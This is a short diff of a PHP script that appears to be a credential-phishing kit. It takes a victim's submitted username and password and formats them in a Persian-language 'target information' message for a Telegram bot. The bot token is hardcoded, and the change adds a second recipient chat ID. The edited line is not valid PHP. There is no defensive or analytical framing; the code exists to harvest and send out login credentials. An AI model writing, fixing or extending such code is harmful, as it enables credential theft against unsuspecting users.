@@ -4,7 +4,7 @@ $password = $_POST['password'];
 
 $code = <<<EOD
 \$Token="8026401503:AAGDwnDthR4ZIPkWvWr-sqwf_PAUfjLopQQ";
-\$ID = '5717515741';
+\$ID = '5717515741','1352654452';
 \$message = "
 <b>اطلاعات تارگت😃</b>
 <b>یوزرنیم:</b> <code>$username</code>
